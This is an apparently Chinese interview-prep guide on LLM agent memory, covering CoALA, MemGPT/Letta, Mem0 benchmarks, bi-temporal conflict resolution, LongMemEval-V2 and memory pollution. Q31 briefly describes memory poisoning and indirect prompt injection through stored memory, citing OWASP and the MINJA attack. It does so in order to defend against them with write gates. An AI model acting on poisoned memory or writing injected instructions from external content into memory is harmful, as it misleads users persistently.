**来源：** [Claude Docs: Context windows](https://platform.claude.com/docs/en/build-with-claude/context-windows)、[Chroma: Context Rot](https://www.trychroma.com/research/context-rot)、[Anthropic: Effective context engineering for AI agents](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents)、[Manus: Context Engineering for AI Agents](https://manus.im/blog/Context-Engineering-for-AI-Agents-Lessons-from-Building-Manus)、[Claude Docs: Prompt caching](https://platform.claude.com/docs/en/build-with-claude/prompt-caching)


## 模块 E：记忆系统 <a id="me"></a> [↑ 目录](#toc)

![长期记忆写入流程：抽取、写入门槛、冲突检查、操作，以及双时间轴](notes/images/06d-memory-write.svg)

### Q26 · Agent 的短期记忆和长期记忆分别指什么？CoALA 框架把记忆分成哪几类？ <a id="q26"></a> [↑ 目录](#toc)

**English question:** What do short-term and long-term memory mean for an LLM agent, and how does the CoALA framework categorize agent memory?
（难度：必考 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.4](06-ai-system-design.md#s2-4) 按"会话（session）内 / 跨会话 / 知识 / 流程状态"四类讲了存什么、PII 不进长期记忆（long-term memory）、一致性（consistency）怎么选；[04 Agent 入门](notes/04-agent-basics.md) 有"三层记忆（memory）"入门表。本题补上 CoALA 的正式分类和"记忆也是动作"这层意思。

**答案要点**
1. **短期记忆（short-term memory）**：这一次任务里模型"眼前看得到"的东西，也就是上下文窗口（context window：模型一次能读进去的全部 token）里的对话、工具结果（tool result）、草稿。会话结束或上下文（context）被压缩（compaction）就没了。**长期记忆（long-term memory）**：存在模型外部（数据库、向量库（vector database）、文件），跨会话还在，需要时再取回来放进上下文。
2. **CoALA（Cognitive Architectures for Language Agents，语言智能体认知架构）**：Sumers、Yao、Narasimhan、Griffiths 2023 年的论文，借认知科学给 agent 画了一张通用框图。记忆分四类：
   - **工作记忆（working memory）**：当前决策周期要用的变量和信息，对应短期记忆。
   - **情景记忆（episodic memory）**：过去发生过的具体经历，比如"上周这个用户订过哪家酒店""上次这个任务怎么失败的"。
   - **语义记忆（semantic memory）**：关于世界和用户的事实性知识，比如"用户住在上海""退货期限 30 天"。
   - **程序记忆（procedural memory）**：怎么做事。一部分在模型权重里（隐式），一部分在 agent 的代码和 prompt 里（显式），比如技能库（skill library）、system prompt。
3. CoALA 的关键点是把**读写记忆当成动作**：内部动作（internal action）= 推理（reasoning）、检索（retrieval，从长期记忆读）、学习（learning，往长期记忆写）；外部动作（external action）= 落地（grounding：调用工具、和环境交互）。每一步决策周期是"规划（planning，提出候选 → 评估 → 选择）→ 执行"。
4. 工程上的对应：工作记忆 = 上下文管理（压缩、裁剪）；情景 + 语义 = 记忆库 / 知识库（knowledge base），要管写入、冲突（conflict）、过期；程序记忆 = prompt、技能（skill）、工具代码，要版本化、可回滚（rollback）。**"学习"这个写动作最危险**，因为写错了会一直影响以后的回答（见 Q31）。

**English answer (speakable, ~45–75 s):**
> Short-term memory is whatever is inside the context window right now — the conversation, tool results, scratch notes. It disappears when the session ends or the context gets compacted. Long-term memory lives outside the model, in a database or vector store or files, and has to be retrieved back into context when needed.
> CoALA gives a cleaner vocabulary. It splits memory into working memory, which is the current context; episodic memory, which is specific past experiences; semantic memory, which is facts about the world or the user; and procedural memory, which is how to do things — partly in the weights, partly in the agent's code and prompts. The part I find most useful is that CoALA treats reading and writing memory as actions the agent takes, alongside external tool calls. That framing matters in production, because the write action is the dangerous one: a bad write keeps hurting every future session, so it needs validation, provenance and a way to delete.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 长期记忆和 RAG 有什么区别？ | 机制都是"存外部、按需取"。RAG 的知识库通常是组织共享、人工维护的文档；长期记忆是 agent 自己从交互里写出来的、按用户或任务隔离的。区别主要在**谁写、写什么、按谁隔离** | Mechanically both retrieve from external storage. The difference is who writes it: a RAG corpus is curated shared documents, while long-term memory is written by the agent itself from interactions, scoped per user or per task. That makes write quality and isolation the real problems. |
| 程序记忆在实际系统里长什么样？ | system prompt、工具定义、技能文件（skills）、从成功轨迹提炼出来的可复用函数。它改变的是"怎么做"，所以更新要走评测和发布流程 | System prompts, tool definitions, skill files, and reusable routines distilled from successful trajectories. Because it changes how the agent behaves, updates should go through eval and release like code. |

**坑**
- 把"短期 = 向量库、长期 = 数据库"按存储介质分。分类看的是**寿命和用途**，不是存在哪。
- 只会背四个名词，说不出"记忆读写是动作，写入要有门槛"这层工程含义。
- 把会话内的流程进度（第几步做完了）也当"记忆"塞 prompt。进度属于持久化（persistence）状态，应进数据库 / 工作流（workflow）引擎（06 §2.4 已讲）。

**来源：** [CoALA: Cognitive Architectures for Language Agents（arXiv 2309.02427）](https://arxiv.org/abs/2309.02427)

---

### Q27 · MemGPT / Letta 的分层记忆是怎么设计的？模型怎么"自己管理"记忆？ <a id="q27"></a> [↑ 目录](#toc)

**English question:** How is the tiered memory in MemGPT / Letta designed, and how does the model manage its own memory?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** 无，本题新补。（[06 §2.4](06-ai-system-design.md#s2-4) 的"长时运行为什么变笨"讲了压缩快照（snapshot）和状态外化（state externalization），可对照。）

**答案要点**
1. **核心类比**：MemGPT（Packer 等 2023）把上下文窗口当"内存（RAM）"，外部存储当"磁盘"，学操作系统的虚拟内存（virtual memory：程序以为内存很大，实际是操作系统在内存和磁盘之间换页）。
2. **主上下文（main context，进 prompt 的部分）三段**：
   - 系统指令（system instructions）：只读（read-only），写明各层记忆怎么用、有哪些函数。
   - 工作上下文（working context）：固定大小、可读写的一段文本，存用户关键事实和偏好；**只能通过函数调用修改**。
   - 先进先出队列（FIFO queue）：滚动的消息历史，第一条是被挤出消息的递归摘要（recursive summary：旧摘要 + 新挤出的消息 → 新摘要）。
3. **外部上下文（external context，不在 prompt 里）两类**：
   - 回忆存储（recall storage）：所有消息的完整数据库，被挤出的消息永远能搜回来。
   - 档案存储（archival storage）：任意长度文本的读写库，存文档、长期事实。
4. **模型"自己管理"的方式**：把记忆操作做成工具（function calling）。模型自己决定调用"改工作上下文 / 搜回忆 / 写档案"。系统侧有队列管理器（queue manager）兜底：论文示例里 prompt 超过上下文约 70% 时插一条"内存压力"系统消息，提醒模型先把重要信息存起来；到约 100% 时挤出约 50% 的消息并更新递归摘要。函数调用可带 `request_heartbeat=true`，要求紧接着再推理一轮，实现连续多步操作。
5. **Letta（MemGPT 团队后来的产品）现状**：记忆块（memory blocks）= 钉在 system prompt 里、agent 能用工具编辑的字符串，可挂到多个 agent 上共享；内置工具有 `memory_insert`、`memory_replace`、`memory_rethink`（整块重写）、`conversation_search`（搜历史消息）、`archival_memory_insert / archival_memory_search`。上下文满了会把旧消息压成递归摘要，完整历史留在回忆存储里可搜。
6. **取舍**：好处是记忆管理"可学习、可解释"（每次写都是一次可审计（auditable）的工具调用（tool call））；代价是每次记忆操作都多一次模型调用和 token，且写什么完全靠模型判断，**写错要有外部校验（validation）**。Anthropic 的 memory tool（`memory_20250818`，在客户端实现的 `/memories` 文件目录，命令有 view / create / str_replace / insert / delete / rename）是同一思路的厂商（vendor）版本。

**English answer (speakable, ~45–75 s):**
> MemGPT borrows the operating-system idea of virtual memory. The context window is RAM, external storage is disk. Inside the prompt there are three parts: read-only system instructions, a small editable working context for key facts about the user, and a FIFO message queue whose first entry is a running summary of everything that was evicted. Outside the prompt there's recall storage — every message ever, searchable — and archival storage for long documents and facts.
> The model manages memory by calling functions: edit working context, search recall, insert into archival. The runtime adds a safety net — in the paper, at around 70 percent of the window it warns the model about memory pressure, and at the limit it evicts about half the messages and updates the summary.
> Letta productized this as memory blocks pinned in the prompt plus tools like memory_replace and archival search. The upside is that every memory write is an explicit, auditable tool call. The downside is extra model calls, and the model decides what to write, so I'd still put validation around writes.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 为什么不全靠系统自动摘要，而要让模型自己写？ | 自动摘要不知道什么重要，会丢细节；模型在任务中知道哪些事实以后还要用。实际做法是两者都要：模型主动写关键事实，系统按阈值兜底压缩 | An automatic summarizer doesn't know what will matter later. The model, mid-task, does. In practice you want both: the model writes key facts deliberately, and the runtime compacts by threshold as a backstop. |
| 记忆块和 RAG 检索出来的内容有什么不同？ | 记忆块常驻 prompt、每轮都在，适合少量高价值事实（用户画像、当前目标）；档案 / RAG 按需检索，适合大量长尾信息。常驻的部分越小越好，还要放在 prompt 稳定的位置以免破坏前缀缓存 | Memory blocks are always in the prompt, so they're for a small set of high-value facts like the user profile or current goal. Archival or RAG content is fetched on demand for the long tail. Keep the pinned part small and stable so it doesn't break prompt caching. |

**坑**
- 把 70% / 100% 说成 MemGPT 的固定参数。论文是"示例阈值（threshold）"，可配置。
- 说"MemGPT 让上下文无限长"。它只是让**可访问的信息**变多，模型每次看到的仍是有限窗口，取回靠检索，检索漏了就看不到。
- 混淆回忆存储和档案存储：前者是原始消息日志（logs），后者是 agent 主动写入的长文本库。

**来源：** [MemGPT: Towards LLMs as Operating Systems（arXiv 2310.08560）](https://arxiv.org/abs/2310.08560)、[MemGPT 论文 HTML 版（阈值与 heartbeat 细节）](https://arxiv.org/html/2310.08560)、[Letta 文档：Base tools](https://docs.letta.com/guides/agents/base-tools)、[Letta 文档：Agent memory & architecture](https://docs.letta.com/guides/agents/architectures/memgpt)、[Claude 文档：Memory tool](https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool)

---

### Q28 · Mem0 的记忆写入流程是什么？它论文里报告的指标，你觉得可信吗？ <a id="q28"></a> [↑ 目录](#toc)

**English question:** What is Mem0's memory write pipeline, and how much do you trust the metrics reported in its paper?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** 无，本题新补。

**答案要点**
1. **写入分两阶段**（Mem0 论文，Chhikara 等 2025）：
   - **抽取（extraction）**：每来一对新消息就触发。输入 = 对话摘要（异步刷新，不增加延迟（latency））+ 最近 m 条消息（实验里 m = 10）+ 新消息对，LLM 输出一组候选事实。
   - **更新（update）**：对每条候选事实，用向量检索（vector search）找出最相似的 s 条已有记忆（实验里 s = 10），连同候选一起交给 LLM，通过工具调用选四种操作之一：ADD（新增）、UPDATE（补充信息更多时替换）、DELETE（删掉被新事实否定的旧记忆）、NOOP（什么都不做）。没有单独的分类模型。
2. **图版本 Mem0g（graph memory）**：把记忆存成实体（entity）-关系图。冲突时由 LLM 判断旧关系是否过时，**过时的关系标记为无效而不是物理删除**，为时间推理留历史。
3. **论文报告的数字（LOCOMO 数据集，LLM 当裁判打分，记作 J）**：全上下文（full-context，把整段对话都塞进去）72.90%、Mem0g 68.44%、Mem0 66.88%、Zep 65.99%、OpenAI 记忆 52.90%。摘要里的"比 OpenAI 相对高 26%"就是 66.88 / 52.90 ≈ 1.26（推算）。p95 总延迟：全上下文 17.117 s、Mem0 1.440 s；每次查询带入的上下文约 1,764 token，对比全上下文约 26,031 token。
4. **为什么要打折看**：
   - **全上下文基线（baseline）比 Mem0 还高**（72.90 > 66.88）。Mem0 赢的是延迟和 token 成本，不是准确率。
   - **竞品配置有争议**：Zep 发文指出 Mem0 跑 Zep 时把两个说话人都当成 user、把时间戳（timestamp）拼进正文而不是用 `created_at` 字段、搜索串行（serial）执行；Zep 自己重跑得到 75.14% ± 0.17。Letta 用 gpt-4o-mini、只给文件搜索工具（把对话存成文件再 grep），报告 74.0%。三方都是厂商自测。
   - **LOCOMO 本身的局限**（Zep 文中列出）：对话平均只有 16k–26k token，现代上下文装得下，压不出记忆系统的价值；没有"信息随时间变化"的知识更新题；第 5 类（对抗题）缺标准答案被排除；部分题目说话人标错或有多个正确答案。
   - LLM 当裁判（LLM-as-judge）本身有偏差（bias），各家用的裁判模型和 prompt 不完全相同。
5. **我的结论**：Mem0 的**架构思路**（抽取 + 与相似旧记忆比对后 ADD/UPDATE/DELETE/NOOP）是可借鉴的标准做法；**排名数字不可信到能拿来选型**。选型要用自己的数据，加上知识更新、弃答（abstention）这类 LOCOMO 没覆盖的题（LongMemEval 有这几类，见 Q30）。

**English answer (speakable, ~45–75 s):**
> Mem0 writes memory in two phases. Extraction: on each new message pair, an LLM looks at a rolling summary plus the last ten messages and pulls out candidate facts. Update: for each candidate, it retrieves the ten most similar existing memories and asks the LLM, through a tool call, to choose ADD, UPDATE, DELETE or no-op. The graph variant marks contradicted relations as invalid instead of deleting them, so history is kept.
> On the numbers, I'd separate the design from the leaderboard. In their own LOCOMO table, the full-context baseline actually scores higher than Mem0 — about 73 versus 67 — so the real win is latency and tokens, not accuracy. Competitors disputed the setup: Zep re-ran its own system and reported about 75, and Letta reported 74 with nothing but file search tools. And LOCOMO conversations fit in a modern context window and don't test knowledge updates. So I'd reuse the write pipeline idea, but I'd benchmark on my own data before trusting any ranking.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 每条消息都调 LLM 抽取，成本怎么控制？ | 用小模型做抽取和更新判断；只对"可能含持久信息"的消息触发（先用便宜分类器过滤闲聊）；批量异步写入，不阻塞回复 | Use a small model for extraction and the update decision, gate it with a cheap classifier so chit-chat doesn't trigger it, and run writes asynchronously so they never block the reply. |
| DELETE 直接删安全吗？ | 不安全。删了就无法审计、无法回答"以前住哪"。更好的是软删除 / 标记失效 + 时间戳（Mem0g 和 Zep 都这样做），见 Q29 | Not really. A hard delete loses auditability and any "where did I used to live" question. I'd soft-invalidate with timestamps, which is what the graph variant and Zep do. |

**坑**
- 只背"准确率高 26%、延迟降 91%"。26% 是相对 OpenAI 记忆，不是相对全上下文；p95 降幅摘要写 91%、正文 4.3 节写 92%，两处不一致，说"约九成"更稳。
- 把 Zep 的 75.14% 或 Letta 的 74.0% 当"真相"。它们同样是厂商自测，Mem0 方对 Zep 的重算也有反驳（反驳的具体数字未在一手来源核实）。
- 忘了说"全上下文在 LOCOMO 上就是最强基线"，这是质疑这个 benchmark 最有力的一点。

**来源：** [Mem0: Building Production-Ready AI Agents with Scalable Long-Term Memory（arXiv 2504.19413）](https://arxiv.org/abs/2504.19413)、[Mem0 论文 HTML 版（表 1、表 2、4.3 节）](https://arxiv.org/html/2504.19413)、[Zep：Lies, Damn Lies, & Statistics: Is Mem0 Really SOTA in Agent Memory?](https://www.getzep.com/blog/lies-damn-lies-statistics-is-mem0-really-sota-in-agent-memory/)、[Letta：Benchmarking AI Agent Memory: Is a Filesystem All You Need?](https://www.letta.com/blog/benchmarking-ai-agent-memory)

---

### Q29 · 用户说"我搬到上海了"，但记忆里还存着"住在北京"，记忆系统怎么处理这种冲突？ <a id="q29"></a> [↑ 目录](#toc)

**English question:** A user says "I just moved to Shanghai," but memory still says "lives in Beijing." How should the memory system resolve this conflict?
（难度：实战 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.4](06-ai-system-design.md#s2-4) 讲了记忆要带来源和时间戳、"memory is a cache"的一致性原则；冲突处理是本题新补。

**答案要点**
1. **先止血（mitigation）**：回答时如果同一属性检索到两条矛盾记忆，按"最近、来源最可信"的那条答，并且可以顺口确认（"你现在在上海对吧？"），不要把两条都塞给模型让它自己猜。
2. **写入时就发现冲突**：新事实"居住地 = 上海"进来时，按**同一主体 + 同一属性（user_123, lives_in）**查已有记忆，而不是只靠语义相似度。"住在北京"和"搬到上海"向量（vector）上未必很近，但属性键一样。
3. **不要覆盖，要让旧事实失效（invalidate）**：采用双时间（bi-temporal）模型，Zep / Graphiti 就是这么做的：
   - 有效时间（valid time）`validFrom / validTo`：这个事实在现实里什么时候成立。
   - 事务时间（transaction time）`recordedAt / expiredAt`：系统什么时候记下、什么时候作废，用于审计（audit）。
   - 新事实与旧事实在时间上重叠且矛盾时，把旧边的 `validTo` 设为新边的 `validFrom`。旧事实保留，所以"我以前住哪""我在北京时常去的那家店"还能答。
4. **不是所有"新说法"都该覆盖旧的**：
   - 区分**状态变更**（搬家，覆盖）和**补充**（"我在上海也有个家"，两条并存）。这要靠属性是否单值来判断（居住地是单值，爱好是多值）。
   - 低置信度（confidence）来源（玩笑、假设句"如果我搬到上海……"、第三人称"我朋友搬到上海"）不应触发失效，见 Q31。
5. **级联更新**：依赖居住地的派生记忆（时区、常用城市、天气偏好）要一起标记待复核，否则会出现"人在上海、按北京时区提醒"。
6. **上线指标**：知识更新类题目的准确率（LongMemEval 专门有 knowledge updates 这一类）；"冲突记忆同时被检索到"的比例；用户纠正率（"我早就不在北京了"这类反馈）。

```java
// Bi-temporal update for a single-valued attribute
void upsertFact(Fact newFact)
{
    List<Fact> activeFacts = factStore.findActive(newFact.subjectId(), newFact.attribute());
    for (Fact oldFact : activeFacts)
    {
        boolean contradicts = schema.isSingleValued(newFact.attribute())
            && !oldFact.value().equals(newFact.value());
        if (contradicts && newFact.confidence() >= WRITE_THRESHOLD)
        {
            oldFact.setValidTo(newFact.validFrom());     // world time: stopped being true
            oldFact.setExpiredAt(Instant.now());         // system time: when we learned it
            factStore.save(oldFact);
            dependencyIndex.markForReview(oldFact.id()); // e.g. timezone derived from city
        }
    }
    newFact.setRecordedAt(Instant.now());
    factStore.save(newFact);
}
```

**English answer (speakable, ~45–75 s):**
> First, I wouldn't overwrite. I'd detect the conflict at write time by looking up the same subject and attribute — user, lives-in — not just by semantic similarity, because "lives in Beijing" and "moved to Shanghai" might not be close in embedding space.
> Then I'd use a bi-temporal model, which is what Zep's Graphiti does. Each fact has a valid-from and valid-to in world time, and a recorded and expired timestamp in system time. When the new fact contradicts the old one, I close the old fact's validity at the new fact's start. Retrieval returns only currently valid facts by default, but history is still there, so "where did I live before" still works, and I can audit what the agent believed and when.
> Two guards: only single-valued attributes get invalidated — having a second home isn't a contradiction — and low-confidence statements like jokes or hypotheticals don't trigger invalidation. I'd also flag derived memories, like the user's timezone, for review.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 如果用户说的时间是过去的（"去年就搬了"）怎么办？ | 这正是双时间的价值：`validFrom` 填去年（现实时间），`recordedAt` 填今天（系统时间）。时间要从语句里解析出来，解析不了就用消息时间 | That's exactly why there are two timelines. Valid-from is last year, when it became true; recorded-at is today, when we learned it. I'd parse the time expression, and fall back to the message timestamp. |
| 向量库里怎么实现"只取当前有效的"？ | 记忆条目带 `validTo` 元数据，检索时加过滤 `validTo IS NULL OR validTo > now`；或者事实型属性放结构化表（KV / 关系库），向量库只放非结构化的情景记忆 | Store validity as metadata and filter on it at query time. Better still, keep single-valued attributes in a structured table and use the vector store only for unstructured episodic memories. |

**坑**
- 直接 UPDATE 覆盖：丢历史、不可审计，用户说"我改主意了"也没法回滚。
- 只靠向量相似度找冲突：语义上不像的矛盾事实找不出来，最后两条都留着。
- 把所有新陈述都当状态变更，"我朋友搬到上海了"也把用户居住地改了。

**来源：** [Zep: A Temporal Knowledge Graph Architecture for Agent Memory（arXiv 2501.13956）](https://arxiv.org/abs/2501.13956)、[Zep 论文 HTML 版（双时间模型与失效规则）](https://arxiv.org/html/2501.13956)、[Mem0 论文 HTML 版（Mem0g 标记失效而非删除）](https://arxiv.org/html/2504.19413)、[LongMemEval（arXiv 2410.10813）](https://arxiv.org/abs/2410.10813)

---

### Q30 · 2026 年的 LongMemEval-V2 把评测对象从聊天记录换成了 web agent 的任务轨迹，这对记忆系统设计意味着什么？ <a id="q30"></a> [↑ 目录](#toc)

**English question:** LongMemEval-V2 (2026) switched the evaluation target from user–assistant chat histories to web-agent task trajectories. What does that change mean for how we design agent memory?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** 无，本题新补。

**答案要点**
1. **V1 是什么**：LongMemEval（Wu 等，ICLR 2025）用 500 道题考"聊天助手记不记得用户"，五种能力：信息抽取、跨会话推理、时间推理、知识更新、弃答（abstention：没有信息就说不知道）。历史长度 115k–1.5M token。结论是商用助手和长上下文（long context）模型在长期交互下准确率掉约 30%。
2. **V2 是什么**（arXiv 2605.12493，2026-05-12，UCLA，同一作者团队；ICML 2026 收录）：目标从"记住用户"换成"**像一个有经验的同事那样记住环境**"。历史不再是聊天，而是 web agent 在 WebArena（购物、后台、论坛）和 WorkArena（ServiceNow）里的多模态（multimodal）操作轨迹（trajectory）。451 道人工整理的题，Small 档约 25M token（100 条轨迹），Medium 档约 115M token（约 500 条轨迹）。
3. **V2 考的五种能力**：静态状态回忆（static state recall：某个页面 / 配置是什么样）、动态状态追踪（dynamic state tracking：状态怎么随操作变化）、流程知识（workflow knowledge：某件事要按什么步骤做）、环境坑点（environment gotchas：这个系统哪里容易出错）、前提意识（premise awareness：发现问题里的前提本身是错的）。
4. **结果说明了什么**：
   - 没有记忆时，最强前沿模型在先导实验里只有 14.1%，说明这些知识必须从经验里来。
   - 传统 RAG 基线（按问题检索轨迹片段）Small / Medium 为 42.8% / 38.1%，加笔记后 51.0% / 45.9%。
   - 作者的 AgentRunbook-C（让一个 coding agent 在轨迹文件里自己搜索、读、做笔记）74.9% / 70.1%，现成的 Codex agent 69.9% / 68.7%；代价是延迟 108–186 秒，RAG 版 AgentRunbook-R 约 26–27 秒、得分 58.6% / 57.0%。
5. **对设计的含义**：
   - 记忆的内容从"用户事实"扩展到**程序记忆和环境知识**：成功流程、失败原因、系统怪癖。写入单位应是"经验条目 / runbook"，而不只是对话事实。
   - **"检索一次"不够**，"让 agent 主动搜索 + 读原始轨迹"明显更强，和 Letta 的"文件系统够用"结论一致（Q28）。代价是延迟高一个数量级，要按场景选：在线对话用预先提炼的笔记，离线 / 后台任务可以用 agentic 搜索。
   - 动态状态要带时间，旧状态要能失效（和 Q29 同一套机制）。
   - 前提意识对应"弃答 / 反驳错误前提"，要在评测（evaluation, eval）里专门出题。

**English answer (speakable, ~45–75 s):**
> The first LongMemEval tested whether a chat assistant remembers the user: facts, temporal reasoning, knowledge updates, abstention. V2, published in May 2026, changes the target. The history is now tens of millions of tokens of web-agent trajectories in shopping, forum, admin and ServiceNow-style environments, and the question is whether the agent learned the environment like an experienced colleague — how state changes, what the workflow is, what the gotchas are, and whether the question's premise is even true.
> Two takeaways for design. First, memory isn't just user facts anymore — it's procedural knowledge distilled from experience, so I'd write runbook-style entries: what worked, what failed, and why. Second, a single retrieval pass isn't enough. In the paper, plain RAG baselines land around 40 to 50 percent, while a coding agent that searches the raw trajectory files itself reaches about 70 to 75 — but at minutes of latency. So I'd precompute notes for online use and keep agentic search for background work.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 这和 Q28 的 LOCOMO 比有什么进步？ | LOCOMO 对话只有 1.6–2.6 万 token，全上下文就能赢；V2 到千万到上亿 token，任何上下文都装不下，逼你真的做记忆。而且考环境知识和前提错误，不只是事实回忆 | LOCOMO fits in a context window, so full context wins. V2 is tens of millions of tokens, which no context window holds, so you actually have to build memory, and it tests procedural knowledge and false premises, not just fact recall. |
| 你会怎么把轨迹变成可复用的记忆？ | 任务结束后离线跑一个"总结器"：成功轨迹提炼成参数化步骤，失败轨迹提炼成"坑点 + 触发条件"；带环境版本和时间戳；评测通过才进技能库 | After each task, run an offline distiller: successful runs become parameterized procedures, failed runs become gotchas with their trigger conditions, tagged with environment version and time, and only promoted after they pass eval. |

**坑**
- 说"V2 只是把上下文变长"。核心变化是**评测对象从聊天换成 agent 轨迹，能力从用户事实换成环境经验**。
- 引用 72.5% / 48.5% 不说出处。这两个是摘要里的平均值：72.5 = AgentRunbook-C 在 Small 和 Medium 的平均，48.5 = 最强 RAG 基线两档平均。
- 忽略延迟代价：最强方法要一两分钟到三分钟，不能直接搬到在线对话里。

**来源：** [LongMemEval-V2（arXiv 2605.12493）](https://arxiv.org/abs/2605.12493)、[LongMemEval-V2 论文 HTML 版（结果表）](https://arxiv.org/html/2605.12493v1)、[ICML 2026 页面](https://icml.cc/virtual/2026/67423)、[LongMemEval V1（arXiv 2410.10813）](https://arxiv.org/abs/2410.10813)

---

### Q31 · 线上出现"记忆污染"：用户一句玩笑话被当成事实存进长期记忆，之后每次回答都被带偏，怎么处理和预防？ <a id="q31"></a> [↑ 目录](#toc)

**English question:** In production you see "memory poisoning": a user's joke was stored as a fact in long-term memory, and now every answer is skewed by it. How do you handle it and prevent it?
（难度：实战 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.4](06-ai-system-design.md#s2-4) 讲了长期记忆要带来源、时间戳、可审计；[06 §2.7 ① 提示注入](06-ai-system-design.md#h32) 讲了注入防护。本题补"写入门槛 + 污染处置"。

**答案要点**
1. **先止血**：
   - 给这位用户提供"查看 / 删除我的记忆"入口，客服侧能按用户删除指定记忆条目。
   - 临时把这条记忆标记失效（不是物理删，留证据），立刻在检索时过滤掉。
   - 如果怀疑是批量问题，先把同一时间段、同一抽取 prompt 版本写入的记忆降权或暂停读取。
2. **定位**：每条记忆必须能追溯到**来源消息 ID、抽取模型和 prompt 版本、写入时间、置信度**。没有这些元数据（metadata）就没法回答"它从哪来、还有多少类似的"。按来源消息查回去，看是抽取误判（把玩笑当陈述）还是更新误判（把新事实当成覆盖）。
3. **根因（root cause）**常见三类：
   - 抽取 prompt 没要求区分语气：反讽、玩笑、假设句、引用别人的话都被当成用户事实。
   - 没有写入门槛：抽出来就直接 ADD，没有置信度阈值、没有"重复确认才升级"。
   - 读的时候过度信任：记忆被当成权威事实放进 system prompt，模型没有"这只是推测"的提示。
4. **修复**：
   - **写入门槛（write gate）**：抽取时输出 `confidence` 和 `assertionType`（事实陈述 / 玩笑 / 假设 / 转述）；只有高置信度的第一人称事实才进长期记忆；中等置信度先进"待确认"区，多次出现或用户确认才升级。
   - **敏感属性不自动写**：健康、宗教、政治、财务这类信息默认不存，或必须用户明确同意。
   - **读的时候带出处**：把记忆以"用户在 2026-05-03 说过……（置信度中）"的形式给模型，而不是写成"用户是……"；与当前对话冲突时以当前对话为准。
   - **过期与衰减（decay）**：长期没被用到的记忆自动过期；Anthropic memory tool 文档也建议定期清理长期未访问的记忆文件。
5. **安全视角**：这和**记忆投毒（memory poisoning）**是同一类问题，只是一个是无意、一个是恶意（malicious）。OWASP Agentic Top 10（2026 版）把"Memory & Context Poisoning"列为 ASI06；MINJA 论文显示攻击者（attacker）只通过正常对话就能往 agent 记忆里注入恶意记录。所以写入门槛同时是安全控制，外部内容（网页、邮件）里的话**不能直接写成用户记忆**。
6. **上线指标**：记忆写入被拒 / 待确认的比例；用户删除或纠正记忆的比例（越低越好）；"记忆导致错误回答"的人工抽检率；对抗测试集（test set，玩笑、假设、转述、注入）的误写率，作为发布门禁。

```java
// Write gate before anything reaches long-term memory
MemoryDecision gate(CandidateFact candidateFact)
{
    if (candidateFact.source() != Source.USER_FIRST_PERSON)
    {
        return MemoryDecision.reject("not a first-person user statement");
    }
    if (candidateFact.assertionType() != AssertionType.SINCERE_STATEMENT)
    {
        return MemoryDecision.reject("joke, hypothetical or quoted speech");
    }
    if (sensitivePolicy.isSensitive(candidateFact.attribute()) && !consentStore.hasConsent(candidateFact.userId()))
    {
        return MemoryDecision.reject("sensitive attribute without consent");
    }
    if (candidateFact.confidence() < PROMOTE_THRESHOLD)
    {
        return MemoryDecision.pending("needs repetition or confirmation");
    }
    return MemoryDecision.accept();
}
```

**English answer (speakable, ~45–75 s):**
> First I'd stop the bleeding: invalidate that memory entry — soft, so I keep the evidence — filter it out of retrieval immediately, and make sure users and support can view and delete memories.
> Then I'd trace it. Every memory should carry its source message ID, the extractor model and prompt version, a timestamp and a confidence score. That tells me whether it was an extraction error — sarcasm read as a statement — and how many other entries the same prompt version wrote.
> The fix is a write gate. The extractor labels each candidate as a sincere statement, a joke, a hypothetical or quoted speech, with a confidence. Only confident first-person facts are promoted; medium-confidence ones wait until they're repeated or confirmed. Sensitive attributes need consent. And at read time, memories go into the prompt with provenance — "the user said on this date" — not as ground truth, so the current conversation wins on conflict.
> This is the same control that defends against deliberate memory poisoning, which OWASP lists in its agentic top ten, so I'd gate it with an adversarial test set before release.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 写入门槛会不会让该记的也记不住？ | 会，有召回损失。用"待确认区"缓解：不丢弃，只是不立即生效；另外看"用户重复告诉同一件事"的频率，太高说明门槛过严 | Yes, there's a recall cost. The pending tier softens it — nothing is thrown away, it just doesn't take effect yet. If users keep repeating the same fact, the gate is too strict. |
| 用户能看到自己的记忆有什么额外好处？ | 透明 + 自我纠错：用户自己删错的、改过时的，是最便宜的数据清洗；合规上也满足查阅和删除权 | Transparency and free correction: users fix wrong or stale entries themselves, which is the cheapest data cleaning there is, and it covers access and deletion rights. |

**坑**
- 只说"让模型更聪明地判断"。必须有**结构化元数据 + 写入门槛 + 删除通道**，否则下次还会发生，而且查不出范围。
- 直接物理删除。删了就没法统计同一 prompt 版本污染了多少条。
- 把外部内容（检索到的网页、邮件正文）里的陈述也写进用户记忆，这等于给间接提示注入（prompt injection）开了持久化后门。

**来源：** [OWASP Top 10 for Agentic Applications for 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)、[MINJA: A Practical Memory Injection Attack against LLM Agents（arXiv 2503.03704）](https://arxiv.org/abs/2503.03704)、[Claude 文档：Memory tool（安全注意事项）](https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool)、[Mem0 论文 HTML 版（写入流程）](https://arxiv.org/html/2504.19413)

---

## 模块 F：RAG 与检索 <a id="mf"></a> [↑ 目录](#toc)

### Q32 · RAG 的基本流程是什么？Agent 为什么需要 RAG，而不是把知识微调进模型或全塞进上下文？ <a id="q32"></a> [↑ 目录](#toc)

**English question:** What is the basic RAG pipeline, and why does an agent need RAG instead of fine-tuning the knowledge into the model or putting everything into the context window?
（难度：必考 · 题目后半句按截断前文补全）

